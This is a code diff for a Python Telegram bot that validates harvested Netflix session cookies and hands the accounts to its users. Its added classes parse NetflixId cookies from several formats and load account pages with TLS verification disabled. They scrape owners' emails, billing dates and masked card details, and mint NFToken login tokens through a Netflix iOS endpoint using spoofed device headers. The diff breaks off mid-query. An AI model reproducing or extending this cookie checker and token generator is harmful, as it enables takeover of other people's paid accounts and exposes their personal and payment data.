@@ -1,9 +1,9 @@
 """
-SENZO NETFLIX BOT - PRODUCTION READY v3.0
-Complete Fix - All Errors Resolved
-Architecture: Clean, Modular, Scalable, Secure
+SENZO NETFLIX BOT - FINAL COMPLETE EDITION
+Version: 4.0.0
+All Features: Working ✓
 Database: Turso (Persistent) + SQLite (Temporary)
-Author: @Senzo268
+Developer: @Senzo268
 """
 
 import sys
@@ -20,11 +20,17 @@ import io
 import html
 import logging
 import traceback
-from datetime import datetime, timedelta
+import shutil
+import random
+import string
+import unicodedata
+from datetime import datetime, timedelta, timezone
 from typing import Dict, List, Optional, Tuple, Any, Union
 from dataclasses import dataclass, asdict
 from contextlib import contextmanager
 from functools import wraps
+from urllib.parse import quote
+from queue import Queue
 
 # ============================================================
 # ENVIRONMENT SETUP
@@ -127,9 +133,21 @@ def health_check():
     return jsonify({
         "status": "online",
         "service": "Senzo Netflix Bot",
-        "version": "3.0.0",
+        "version": "4.0.0",
         "database": "Turso + SQLite",
         "developer": "@Senzo268",
+        "features": [
+            "Multi-thread Cookie Checker",
+            "GraphQL Account Parsing",
+            "NFToken Generation",
+            "Telegram Notifications",
+            "User Management",
+            "Report System",
+            "Broadcast System",
+            "Working/Not Working Reports",
+            "Channel Posts",
+            "Admin Panel"
+        ],
         "timestamp": datetime.utcnow().isoformat()
     }), 200
 
@@ -169,6 +187,7 @@ class Account:
     email: str = ""
     country: str = ""
     plan: str = ""
+    plan_key: str = ""
     cookies: str = ""
     nftoken: str = ""
     nftoken_expiry: str = ""
@@ -186,19 +205,7 @@ class Account:
     phone: str = ""
     extra_member: bool = False
     membership_status: str = ""
-
-@dataclass
-class Report:
-    id: int = 0
-    user_id: int = 0
-    account_id: int = 0
-    report_type: str = ""
-    screenshot_file_id: str = ""
-    status: str = "pending"
-    reported_at: str = ""
-    reviewed_at: str = ""
-    admin_id: int = 0
-    channel_post_id: int = 0
+    on_hold: bool = False
 
 # ============================================================
 # UTILITY FUNCTIONS
@@ -234,7 +241,6 @@ def is_admin(user_id: int) -> bool:
     return user_id in ADMIN_IDS
 
 def retry_on_failure(max_retries: int = 3, delay: float = 1.0):
-    """Decorator for retrying failed operations."""
     def decorator(func):
         @wraps(func)
         def wrapper(*args, **kwargs):
@@ -253,11 +259,434 @@ def retry_on_failure(max_retries: int = 3, delay: float = 1.0):
     return decorator
 
 # ============================================================
-# DATABASE MANAGER - SINGLETON PATTERN
+# ADVANCED COOKIE EXTRACTION
+# ============================================================
+class CookieExtractor:
+    """Advanced cookie extraction with multiple formats."""
+    
+    @staticmethod
+    def extract_bundles(content: str) -> List[Dict]:
+        """Extract multiple cookie bundles from content."""
+        bundles = []
+        
+        # Try JSON format
+        try:
+            data = json.loads(content)
+            if isinstance(data, dict):
+                cookies = data.get("cookies", [])
+                if cookies:
+                    bundles = CookieExtractor._build_bundles_from_json(cookies)
+                    if bundles:
+                        return bundles
+        except:
+            pass
+        
+        # Try Netscape format
+        bundles = CookieExtractor._extract_netscape_bundles(content)
+        if bundles:
+            return bundles
+        
+        # Try raw regex extraction
+        bundles = CookieExtractor._extract_raw_bundles(content)
+        return bundles
+    
+    @staticmethod
+    def _build_bundles_from_json(cookies: List[Dict]) -> List[Dict]:
+        """Build cookie bundles from JSON cookies."""
+        bundles = []
+        netflix_ids = []
+        secure_ids = []
+        
+        for cookie in cookies:
+            if cookie.get("name") == "NetflixId":
+                netflix_ids.append(cookie.get("value", ""))
+            elif cookie.get("name") == "SecureNetflixId":
+                secure_ids.append(cookie.get("value", ""))
+        
+        max_count = max(len(netflix_ids), len(secure_ids), 1)
+        
+        for i in range(max_count):
+            nid = netflix_ids[i] if i < len(netflix_ids) else None
+            sid = secure_ids[i] if i < len(secure_ids) else None
+            
+            if nid:
+                bundle = {
+                    "index": i + 1,
+                    "total": max_count,
+                    "cookies": {"NetflixId": nid}
+                }
+                if sid:
+                    bundle["cookies"]["SecureNetflixId"] = sid
+                bundles.append(bundle)
+        
+        return bundles
+    
+    @staticmethod
+    def _extract_netscape_bundles(content: str) -> List[Dict]:
+        """Extract bundles from Netscape format."""
+        bundles = []
+        entries = []
+        
+        for line in content.splitlines():
+            line = line.strip()
+            if not line or line.startswith('#'):
+                continue
+            
+            parts = line.split('\t')
+            if len(parts) >= 7:
+                domain = parts[0]
+                name = parts[5]
+                value = parts[6]
+                
+                if name == "NetflixId" and "netflix" in domain.lower():
+                    entries.append({
+                        "name": name,
+                        "value": value,
+                        "secure": False
+                    })
+                elif name == "SecureNetflixId":
+                    entries.append({
+                        "name": name,
+                        "value": value,
+                        "secure": True
+                    })
+        
+        if entries:
+            bundle = {"index": 1, "total": 1, "cookies": {}}
+            for entry in entries:
+                bundle["cookies"][entry["name"]] = entry["value"]
+            bundles.append(bundle)
+        
+        return bundles
+    
+    @staticmethod
+    def _extract_raw_bundles(content: str) -> List[Dict]:
+        """Extract bundles using regex patterns."""
+        bundles = []
+        
+        netflix_pattern = re.compile(r'NetflixId[=:]\s*([^\s;\r\n"\']+)', re.IGNORECASE)
+        secure_pattern = re.compile(r'SecureNetflixId[=:]\s*([^\s;\r\n"\']+)', re.IGNORECASE)
+        
+        netflix_matches = netflix_pattern.findall(content)
+        secure_matches = secure_pattern.findall(content)
+        
+        for i, nid in enumerate(netflix_matches):
+            nid = nid.strip('"\'')
+            sid = secure_matches[i].strip('"\'') if i < len(secure_matches) else None
+            
+            if nid and len(nid) > 10:
+                bundle = {
+                    "index": i + 1,
+                    "total": len(netflix_matches),
+                    "cookies": {"NetflixId": nid}
+                }
+                if sid:
+                    bundle["cookies"]["SecureNetflixId"] = sid
+                bundles.append(bundle)
+        
+        return bundles
+
+# ============================================================
+# ENHANCED NETFLIX SERVICE
+# ============================================================
+class NetflixService:
+    """Enhanced Netflix service with GraphQL parsing and advanced features."""
+    
+    NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
+    
+    PLAN_ALIASES = {
+        "premium": {"premium", "高級", "高级", "cao_cap", "ozel", "المميزة", "พรีเมียม", "프리미엄", "プレミアム"},
+        "standard": {"standard", "estandar", "标准", "標準", "standardowy", "padrao", "standart", "スタンダード"},
+        "basic": {"basic", "basico", "dasar", "基本", "베이직", "ベーシック", "temel", "พื้นฐาน"},
+        "mobile": {"mobile", "ponsel", "seluler", "movil", "มือถือ", "모바일", "モバイル"},
+    }
+    
+    @staticmethod
+    def extract_cookie_bundles(content: str) -> List[Dict]:
+        return CookieExtractor.extract_bundles(content)
+    
+    @staticmethod
+    def get_cookie_text(cookies_dict: Dict) -> str:
+        lines = []
+        for name, value in cookies_dict.items():
+            secure = "TRUE" if name == "SecureNetflixId" else "FALSE"
+            lines.append(f".netflix.com\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
+        return "\n".join(lines)
+    
+    @staticmethod
+    def parse_account_page(response_text: str) -> Dict:
+        info = {}
+        try:
+            data = json.loads(response_text)
+            if "data" in data and "growthAccount" in data["data"]:
+                growth = data["data"]["growthAccount"]
+                info["email"] = growth.get("growthEmail", {}).get("email", {}).get("value")
+                info["accountOwnerName"] = growth.get("currentProfile", {}).get("name")
+                info["countryOfSignup"] = growth.get("countryOfSignUp", {}).get("code")
+                info["memberSince"] = growth.get("memberSince")
+                info["nextBillingDate"] = growth.get("nextBillingDate", {}).get("localDate")
+                info["userGuid"] = growth.get("ownerGuid")
+                info["membershipStatus"] = growth.get("membershipStatus")
+                current_plan = growth.get("currentPlan", {}).get("plan", {})
+                info["localizedPlanName"] = current_plan.get("name")
+                info["maxStreams"] = current_plan.get("maxStreams")
+                info["videoQuality"] = current_plan.get("videoQuality")
+                info["planPrice"] = current_plan.get("priceDisplay")
+                payment_methods = growth.get("growthPaymentMethods", [])
+                if payment_methods:
+                    payment = payment_methods[0]
+                    info["paymentMethodType"] = payment.get("__typename")
+                    info["maskedCard"] = payment.get("displayText")
+                profiles = growth.get("profiles", [])
+                info["profiles"] = [p.get("name") for p in profiles if p.get("name")]
+                info["profilesDisplay"] = ", ".join(info["profiles"]) if info["profiles"] else None
+                hold = growth.get("growthHoldMetadata", {})
+                info["holdStatus"] = hold.get("isUserOnHold")
+        except:
+            pass
+        
+        if not info.get("email"):
+            email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', response_text)
+            if email_match:
+                info["email"] = email_match.group(1)
+        
+        return info
+    
+    @staticmethod
+    def is_subscribed(info: Dict) -> bool:
+        if not info:
+            return False
+        status = safe_str(info.get("membershipStatus", "")).lower()
+        if "current_member" in status:
+            return True
+        if info.get("localizedPlanName"):
+            plan = safe_str(info.get("localizedPlanName")).lower()
+            if not any(x in plan for x in ["free", "trial"]):
+                return True
+        if info.get("nextBillingDate"):
+            return True
+        return False
+    
+    @staticmethod
+    def is_on_hold(info: Dict) -> bool:
+        if not info:
+            return False
+        hold = safe_bool(info.get("holdStatus"))
+        if hold:
+            return True
+        status = safe_str(info.get("membershipStatus", "")).lower()
+        hold_indicators = ["hold", "past_due", "payment_retry", "paused", "suspend"]
+        return any(indicator in status for indicator in hold_indicators)
+    
+    @staticmethod
+    def derive_plan(info: Dict, is_subscribed: bool) -> Tuple[str, str]:
+        if not is_subscribed:
+            return "free", "Free"
+        plan_name = safe_str(info.get("localizedPlanName", "")).lower()
+        streams = safe_int(info.get("maxStreams"))
+        quality = safe_str(info.get("videoQuality", "")).lower()
+        
+        for key, aliases in NetflixService.PLAN_ALIASES.items():
+            if any(alias in plan_name for alias in aliases):
+                return key, key.capitalize()
+        
+        if streams >= 4 or "uhd" in quality or "4k" in quality:
+            return "premium", "Premium"
+        elif streams >= 2 or "hd" in quality:
+            return "standard", "Standard"
+        elif streams == 1:
+            return "basic", "Basic"
+        
+        return "unknown", "Unknown"
+    
+    @staticmethod
+    def generate_nftoken(netflix_id: str, attempts: int = 3) -> Tuple[Optional[str], Optional[str]]:
+        if not netflix_id:
+            return None, None
+        
+        query_params = {
+            "appVersion": "15.48.1",
+            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
+            "device_type": "NFAPPL-02-",
+            "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+            "idiom": "phone",
+            "iosVersion": "15.8.5",
+            "isTablet": "false",
+            "languages": "en-US",
+            "locale": "en-US",
+            "maxDeviceWidth": "375",
+            "model": "saget",
+            "modelType": "IPHONE8-1",
+            "odpAware": "true",
+            "path": '["account","token","default"]',
+            "pathFormat": "graph",
+            "pixelDensity": "2.0",
+            "progressive": "false",
+            "responseFormat": "json",
+        }
+        
+        headers = {
+            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+            "x-netflix.request.attempt": "1",
+            "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+            "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
+            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
+            "x-netflix.context.app-version": "15.48.1",
+            "x-netflix.argo.translated": "true",
+            "x-netflix.context.form-factor": "phone",
+            "x-netflix.context.sdk-version": "2012.4",
+            "x-netflix.client.appversion": "15.48.1",
+            "x-netflix.context.max-device-width": "375",
+            "x-netflix.context.ab-tests": "",
+            "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
+            "x-netflix.client.type": "argo",
+            "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
+            "x-netflix.context.locales": "en-US",
+            "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+            "x-netflix.client.iosversion": "15.8.5",
+            "accept-language": "en-US;q=1",
+            "x-netflix.argo.abtests": "",
+            "x-netflix.context.os-version": "15.8.5",
+            "x-netflix.request.client.context": '{"appState":"foreground"}',
+            "x-netflix.context.ui-flavor": "argo",
+            "x-netflix.argo.nfnsm": "9",
+            "x-netflix.context.pixel-density": "2.0",
+            "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
+            "x-netflix.request.client.timezoneid": "Asia/Dhaka",
+        }
+        
+        for attempt in range(attempts):
+            try:
+                headers_copy = dict(headers)
+                headers_copy["Cookie"] = f"NetflixId={netflix_id}"
+                headers_copy["x-netflix.request.attempt"] = str(attempt + 1)
+                
+                response = requests.get(
+                    NetflixService.NFTOKEN_API_URL,
+                    params=query_params,
+                    headers=headers_copy,
+                    timeout=30,
+                    verify=False
+                )
+                
+                if response.status_code == 200:
+                    data = response.json()
+                    token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+                    token = token_data.get("token")
+                    expires = token_data.get("expires")
+                    if token:
+                        expiry_str = None
+                        if expires:
+                            try:
+                                ts = int(expires)
+                                if len(str(ts)) == 13:
+                                    ts //= 1000
+                                expiry_str = datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+                            except:
+                                expiry_str = expires
+                        return token, expiry_str
+                time.sleep(0.5)
+            except:
+                time.sleep(0.5)
+        
+        return None, None
+    
+    @staticmethod
+    def check_account(cookies_dict: Dict) -> Dict:
+        if not cookies_dict or "NetflixId" not in cookies_dict:
+            return {"valid": False, "error": "Missing NetflixId"}
+        
+        try:
+            session = requests.Session()
+            for name, value in cookies_dict.items():
+                session.cookies.set(name, value, domain=".netflix.com", path="/")
+            
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "identity",
+            }
+            
+            urls = [
+                "https://www.netflix.com/account/membership",
+                "https://www.netflix.com/YourAccount",
+                "https://www.netflix.com/browse"
+            ]
+            
+            for attempt in range(MAX_RETRIES):
+                for url in urls:
+                    try:
+                        response = session.get(
+                            url,
+                            headers=headers,
+                            timeout=CHECK_TIMEOUT,
+                            verify=False,
+                            allow_redirects=True
+                        )
+                        
+                        if response.status_code == 200:
+                            if "login" in response.url.lower() or "signin" in response.url.lower():
+                                continue
+                            
+                            text = response.text
+                            info = NetflixService.parse_account_page(text)
+                            is_subscribed = NetflixService.is_subscribed(info)
+                            
+                            nftoken = None
+                            nftoken_expiry = None
+                            if cookies_dict.get("NetflixId"):
+                                nftoken, nftoken_expiry = NetflixService.generate_nftoken(cookies_dict.get("NetflixId"))
+                            
+                            plan_key, plan_label = NetflixService.derive_plan(info, is_subscribed)
+                            on_hold = NetflixService.is_on_hold(info)
+                            
+                            return {
+                                "valid": True,
+                                "subscribed": is_subscribed,
+                                "on_hold": on_hold,
+                                "info": info,
+                                "plan_key": plan_key,
+                                "plan_label": plan_label,
+                                "nftoken": nftoken,
+                                "nftoken_expiry": nftoken_expiry,
+                            }
+                    except:
+                        continue
+                
+                if attempt < MAX_RETRIES - 1:
+                    time.sleep(1)
+            
+            return {"valid": False, "error": "Could not validate account"}
+        except Exception as e:
+            logger.error(f"check_account error: {e}")
+            return {"valid": False, "error": str(e)}
+
+# ============================================================
+# DUPLICATE TRACKER
+# ============================================================
+class DuplicateTracker:
+    def __init__(self):
+        self.processed = set()
+        self.lock = threading.Lock()
+    
+    def is_duplicate(self, email: str) -> bool:
+        if not email:
+            return False
+        with self.lock:
+            if email in self.processed:
+                return True
+            self.processed.add(email)
+            return False
+    
+    def reset(self):
+        with self.lock:
+            self.processed.clear()
+
+# ============================================================
+# DATABASE MANAGER
 # ============================================================
 class DatabaseManager:
-    """Thread-safe database manager with dual connection support."""
-    
     _instance = None
     _lock = threading.Lock()
     
@@ -275,15 +704,12 @@ class DatabaseManager:
         self.use_turso = False
         self._turso_lock = threading.Lock()
         self._sqlite_lock = threading.Lock()
-        self._initialized = False
         
         self._connect_turso()
         self._connect_sqlite()
-        self._initialized = True
     
     @retry_on_failure(max_retries=3, delay=2.0)
     def _connect_turso(self):
-        """Establish Turso connection for persistent data."""
         if HAS_LIBSQL and TURSO_DATABASE_URL and TURSO_DATABASE_URL.startswith("libsql://"):
             try:
                 if TURSO_AUTH_TOKEN:
@@ -299,14 +725,12 @@ class DatabaseManager:
     
     @retry_on_failure(max_retries=3, delay=1.0)
     def _connect_sqlite(self):
-        """Establish SQLite connection for temporary accounts."""
         try:
             self.sqlite_conn = sqlite3.connect("accounts.db", check_same_thread=False, timeout=30)
             self.sqlite_conn.execute('PRAGMA journal_mode=WAL')
             self.sqlite_conn.execute('PRAGMA synchronous=NORMAL')
             self.sqlite_conn.execute('PRAGMA cache_size=10000')
             self.sqlite_conn.execute('PRAGMA temp_store=MEMORY')
-            self.sqlite_conn.execute('PRAGMA foreign_keys=ON')
             logger.info("✅ SQLite connected (Accounts)")
             self._init_sqlite_tables()
         except Exception as e:
@@ -314,13 +738,10 @@ class DatabaseManager:
             raise
     
     def _init_turso_tables(self):
-        """Initialize persistent tables in Turso."""
         if not self.turso_conn:
             return
-            
         with self._turso_lock:
             cur = self.turso_conn.cursor()
-            
             cur.execute('''
                 CREATE TABLE IF NOT EXISTS users (
                     user_id INTEGER PRIMARY KEY,
@@ -425,19 +846,17 @@ class DatabaseManager:
             logger.info("✅ Turso tables initialized")
     
     def _init_sqlite_tables(self):
-        """Initialize accounts table in SQLite."""
         if not self.sqlite_conn:
             return
-            
         with self._sqlite_lock:
             cur = self.sqlite_conn.cursor()
-            
             cur.execute('''
                 CREATE TABLE IF NOT EXISTS accounts (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     email TEXT,
                     country TEXT,
                     plan TEXT,
+                    plan_key TEXT,
                     cookies TEXT,
                     nftoken TEXT,
                     nftoken_expiry TEXT,
@@ -463,21 +882,19 @@ class DatabaseManager:
                     email_verified BOOLEAN DEFAULT 0,
                     profiles TEXT,
                     user_guid TEXT,
-                    working_confirmed BOOLEAN DEFAULT 0
+                    working_confirmed BOOLEAN DEFAULT 0,
+                    on_hold BOOLEAN DEFAULT 0
                 )
             ''')
-            
             cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_status ON accounts(status, is_working)')
             cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_assigned ON accounts(assigned_to)')
             cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_email ON accounts(email)')
-            cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_plan ON accounts(plan)')
-            
+            cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_plan ON accounts(plan_key)')
             self.sqlite_conn.commit()
             logger.info("✅ SQLite accounts table initialized")
     
     @contextmanager
     def turso_cursor(self):
-        """Context manager for Turso cursor."""
         if not self.turso_conn:
             raise RuntimeError("Turso connection not available")
         with self._turso_lock:
@@ -489,7 +906,6 @@ class DatabaseManager:
     
     @contextmanager
     def sqlite_cursor(self):
-        """Context manager for SQLite cursor."""
         if not self.sqlite_conn:
             raise RuntimeError("SQLite connection not available")
         with self._sqlite_lock:
@@ -501,7 +917,6 @@ class DatabaseManager:
     
     @retry_on_failure(max_retries=3, delay=1.0)
     def execute_turso(self, query: str, params: Optional[tuple] = None) -> Any:
-        """Execute query on Turso."""
         with self.turso_cursor() as cur:
             if params:
                 cur.execute(query, params)
@@ -511,7 +926,6 @@ class DatabaseManager:
     
     @retry_on_failure(max_retries=3, delay=1.0)
     def execute_sqlite(self, query: str, params: Optional[tuple] = None) -> Any:
-        """Execute query on SQLite."""
         with self.sqlite_cursor() as cur:
             if params:
                 cur.execute(query, params)
@@ -520,56 +934,43 @@ class DatabaseManager:
             return cur
     
     def commit_turso(self):
-        """Commit Turso transaction."""
         if self.turso_conn:
             with self._turso_lock:
                 self.turso_conn.commit()
     
     def commit_sqlite(self):
-        """Commit SQLite transaction."""
         if self.sqlite_conn:
             with self._sqlite_lock:
                 self.sqlite_conn.commit()
+
+db = DatabaseManager()
 
 # ============================================================
 # REPOSITORY LAYER
 # ============================================================
 class UserRepository:
-    """Repository for user operations."""
-    
     def __init__(self, db: DatabaseManager):
         self.db = db
     
     def get(self, user_id: int) -> User:
-        """Get user by ID."""
         try:
             cur = self.db.execute_turso('SELECT * FROM users WHERE user_id = ?', (user_id,))
             row = cur.fetchone()
             if row:
                 return User(
-                    user_id=row[0],
-                    username=safe_str(row[1]),
-                    first_name=safe_str(row[2]),
-                    joined_at=safe_str(row[3]),
-                    is_banned=safe_bool(row[4]),
-                    is_admin=safe_bool(row[5]),
-                    last_account_time=safe_str(row[6]),
-                    total_working=safe_int(row[7]),
-                    total_notworking=safe_int(row[8]),
-                    working_reports=safe_int(row[9]),
-                    notworking_reports=safe_int(row[10]),
-                    accounts_used=safe_int(row[11]),
-                    pending_report=safe_bool(row[12]),
-                    pending_report_account_id=safe_int(row[13]),
-                    pending_report_type=safe_str(row[14]),
-                    warnings=safe_int(row[15])
+                    user_id=row[0], username=safe_str(row[1]), first_name=safe_str(row[2]),
+                    joined_at=safe_str(row[3]), is_banned=safe_bool(row[4]), is_admin=safe_bool(row[5]),
+                    last_account_time=safe_str(row[6]), total_working=safe_int(row[7]),
+                    total_notworking=safe_int(row[8]), working_reports=safe_int(row[9]),
+                    notworking_reports=safe_int(row[10]), accounts_used=safe_int(row[11]),
+                    pending_report=safe_bool(row[12]), pending_report_account_id=safe_int(row[13]),
+                    pending_report_type=safe_str(row[14]), warnings=safe_int(row[15])
                 )
         except Exception as e:
-            logger.error(f"UserRepository.get error for {user_id}: {e}")
+            logger.error(f"UserRepository.get error: {e}")
         return User(user_id=user_id)
     
     def create_or_update(self, user_id: int, username: str = "", first_name: str = "") -> bool:
-        """Create or update user."""
         try:
             is_admin_flag = 1 if user_id in ADMIN_IDS else 0
             self.db.execute_turso('''
@@ -584,7 +985,6 @@ class UserRepository:
             return False
     
     def get_all(self) -> List[User]:
-        """Get all users."""
         try:
             cur = self.db.execute_turso('''
                 SELECT user_id, username, first_name, is_banned, warnings, accounts_used 
@@ -593,12 +993,8 @@ class UserRepository:
             rows = cur.fetchall()
             return [
                 User(
-                    user_id=r[0],
-                    username=safe_str(r[1]),
-                    first_name=safe_str(r[2]),
-                    is_banned=safe_bool(r[3]),
-                    warnings=safe_int(r[4]),
-                    accounts_used=safe_int(r[5])
+                    user_id=r[0], username=safe_str(r[1]), first_name=safe_str(r[2]),
+                    is_banned=safe_bool(r[3]), warnings=safe_int(r[4]), accounts_used=safe_int(r[5])
                 )
                 for r in rows
             ]
@@ -607,7 +1003,6 @@ class UserRepository:
             return []
     
     def get_banned(self) -> List[Tuple]:
-        """Get all banned users."""
         try:
             cur = self.db.execute_turso('SELECT user_id, username, first_name FROM users WHERE is_banned = 1')
             return cur.fetchall()
@@ -616,12 +1011,9 @@ class UserRepository:
             return []
     
     def ban(self, user_id: int, admin_id: int, reason: str) -> bool:
-        """Ban a user."""
         try:
             self.db.execute_turso('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
-            self.db.execute_turso('''
-                INSERT INTO ban_logs (user_id, admin_id, reason) VALUES (?, ?, ?)
-            ''', (user_id, admin_id, reason))
+            self.db.execute_turso('INSERT INTO ban_logs (user_id, admin_id, reason) VALUES (?, ?, ?)', (user_id, admin_id, reason))
             self.db.commit_turso()
             return True
         except Exception as e:
@@ -629,7 +1021,6 @@ class UserRepository:
             return False
     
     def unban(self, user_id: int) -> bool:
-        """Unban a user."""
         try:
             self.db.execute_turso('UPDATE users SET is_banned = 0, warnings = 0 WHERE user_id = ?', (user_id,))
             self.db.commit_turso()
@@ -639,29 +1030,24 @@ class UserRepository:
             return False
     
     def add_warning(self, user_id: int, admin_id: int, reason: str) -> int:
-        """Add warning to user and return warning count."""
         try:
             cur = self.db.execute_turso('SELECT warnings FROM users WHERE user_id = ?', (user_id,))
             row = cur.fetchone()
             warnings = (row[0] if row else 0) + 1
-            
             self.db.execute_turso('UPDATE users SET warnings = ? WHERE user_id = ?', (warnings, user_id))
             self.db.execute_turso('''
                 INSERT INTO warning_logs (user_id, admin_id, reason, warning_number)
                 VALUES (?, ?, ?, ?)
             ''', (user_id, admin_id, reason, warnings))
             self.db.commit_turso()
-            
             if warnings >= 3:
                 self.ban(user_id, admin_id, "3 warnings - Auto ban")
-            
             return warnings
         except Exception as e:
             logger.error(f"UserRepository.add_warning error: {e}")
             return 0
     
     def update_cooldown(self, user_id: int) -> bool:
-        """Update user's last account time."""
         try:
             self.db.execute_turso('''
                 UPDATE users 
@@ -675,7 +1061,6 @@ class UserRepository:
             return False
     
     def find_by_query(self, query: str) -> Optional[User]:
-        """Find user by ID or username."""
         try:
             q = query.strip().lstrip('@')
             if q.isdigit():
@@ -689,28 +1074,26 @@ class UserRepository:
         return None
 
 class AccountRepository:
-    """Repository for account operations."""
-    
-    def __init__(self, db: DatabaseManager):
+    def __init__(self, db: DatabaseManager, duplicate_tracker: DuplicateTracker):
         self.db = db
+        self.duplicate_tracker = duplicate_tracker
     
     def get_available(self, plan_filter: Optional[str] = None) -> List[Account]:
-        """Get all available accounts."""
         try:
             if plan_filter:
                 cur = self.db.execute_sqlite('''
-                    SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
+                    SELECT id, email, country, plan, plan_key, cookies, nftoken, nftoken_expiry, status,
                            account_name, streams, quality, price, billing_date, profiles,
-                           user_guid, phone, extra_member, membership_status
+                           user_guid, phone, extra_member, membership_status, on_hold
                     FROM accounts 
-                    WHERE status = 'available' AND is_working = 1 AND UPPER(plan) = UPPER(?) 
+                    WHERE status = 'available' AND is_working = 1 AND plan_key = ? 
                     ORDER BY id ASC
                 ''', (plan_filter,))
             else:
                 cur = self.db.execute_sqlite('''
-                    SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
+                    SELECT id, email, country, plan, plan_key, cookies, nftoken, nftoken_expiry, status,
                            account_name, streams, quality, price, billing_date, profiles,
-                           user_guid, phone, extra_member, membership_status
+                           user_guid, phone, extra_member, membership_status, on_hold
                     FROM accounts 
                     WHERE status = 'available' AND is_working = 1 
                     ORDER BY id ASC
@@ -718,24 +1101,13 @@ class AccountRepository:
             rows = cur.fetchall()
             return [
                 Account(
-                    id=r[0],
-                    email=safe_str(r[1]),
-                    country=safe_str(r[2]),
-                    plan=safe_str(r[3]),
-                    cookies=safe_str(r[4]),
-                    nftoken=safe_str(r[5]),
-                    nftoken_expiry=safe_str(r[6]),
-                    status=safe_str(r[7]),
-                    account_name=safe_str(r[8]),
-                    streams=safe_int(r[9]),
-                    quality=safe_str(r[10]),
-                    price=safe_str(r[11]),
-                    billing_date=safe_str(r[12]),
-                    profiles=safe_str(r[13]),
-                    user_guid=safe_str(r[14]),
-                    phone=safe_str(r[15]),
-                    extra_member=safe_bool(r[16]),
-                    membership_status=safe_str(r[17])
+                    id=r[0], email=safe_str(r[1]), country=safe_str(r[2]), plan=safe_str(r[3]),
+                    plan_key=safe_str(r[4]), cookies=safe_str(r[5]), nftoken=safe_str(r[6]),
+                    nftoken_expiry=safe_str(r[7]), status=safe_str(r[8]),
+                    account_name=safe_str(r[9]), streams=safe_int(r[10]), quality=safe_str(r[11]),
+                    price=safe_str(r[12]), billing_date=safe_str(r[13]), profiles=safe_str(r[14]),
+                    user_guid=safe_str(r[15]), phone=safe_str(r[16]), extra_member=safe_bool(r[17]),
+                    membership_status=safe_str(r[18]), on_hold=safe_bool(r[19])
                 )
                 for r in rows
             ]
@@ -744,49 +1116,40 @@ class AccountRepository:
             return []
     
     def get_total(self) -> Dict[str, Union[int, Dict]]:
-        """Get total account count and breakdown."""
         try:
             cur = self.db.execute_sqlite('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
             total = cur.fetchone()[0] or 0
-            
             cur = self.db.execute_sqlite('''
-                SELECT plan, COUNT(*) FROM accounts 
+                SELECT plan_key, COUNT(*) FROM accounts 
                 WHERE status = 'available' AND is_working = 1 
-                GROUP BY plan
+                GROUP BY plan_key
             ''')
             plan_counts = {safe_str(r[0]): safe_int(r[1]) for r in cur.fetchall()}
-            
             return {"total": total, "plans": plan_counts}
         except Exception as e:
             logger.error(f"AccountRepository.get_total error: {e}")
             return {"total": 0, "plans": {}}
     
     def assign(self, user_id: int) -> Optional[Account]:
-        """Assign an account to a user."""
         try:
             accounts = self.get_available()
             if not accounts:
                 return None
-            
             account = accounts[0]
-            
             self.db.execute_sqlite('''
                 UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = 'available' 
                 WHERE assigned_to = ?
             ''', (user_id,))
-            
             cur = self.db.execute_sqlite('''
                 UPDATE accounts 
                 SET assigned_to = ?, assigned_at = CURRENT_TIMESTAMP, status = 'assigned' 
                 WHERE id = ? AND status = 'available'
